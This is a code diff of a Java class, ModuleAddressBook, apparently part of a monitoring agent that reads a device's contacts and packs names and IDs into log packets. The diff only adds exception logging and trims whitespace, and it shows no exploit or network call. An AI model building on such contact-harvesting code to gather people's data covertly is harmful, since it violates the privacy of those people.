@@ -65,13 +65,15 @@ public class ModuleAddressBook extends BaseModule {
 			try {
 				contacts = (HashMap<Long, Long>) markupContacts.readMarkupSerializable();
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
 				}
 			}
 		}
-
-		
 
 		// if no markup available, create a new empty one
 		if (contacts == null) {
@@ -79,7 +81,6 @@ public class ModuleAddressBook extends BaseModule {
 			serializeContacts();
 		}
 
-	
 	}
 
 	/**
@@ -97,12 +98,15 @@ public class ModuleAddressBook extends BaseModule {
 				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
 			}
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
 			}
 		}
 	}
-
 
 	/**
 	 * Every once and then read the contactInfo, and Check.every change. If
@@ -118,15 +122,16 @@ public class ModuleAddressBook extends BaseModule {
 				serializeContacts();
 			}
 		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go) Error: " + ex);
 			}
 		}
 
 	}
-
-	
-	
 
 	private boolean contacts() {
 		contact = new PickContact();
@@ -187,9 +192,6 @@ public class ModuleAddressBook extends BaseModule {
 		log.close();
 	}
 
-	
-
-
 	/**
 	 * Prepare the packet from the contact
 	 * 
@@ -218,6 +220,10 @@ public class ModuleAddressBook extends BaseModule {
 			outputStream.write(Utils.intToByteArray(version));
 			outputStream.write(Utils.intToByteArray((int) uid));
 		} catch (IOException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (preparePacket) Error: " + ex);
 			}
@@ -252,6 +258,10 @@ public class ModuleAddressBook extends BaseModule {
 				outputStream.write(Utils.intToByteArray(header));
 				outputStream.write(WChar.getBytes(name, false));
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(e);//$NON-NLS-1$
 				}
@@ -261,8 +271,6 @@ public class ModuleAddressBook extends BaseModule {
 			}
 		}
 	}
-
-	
 
 	@Override
 	public void actualStop() {
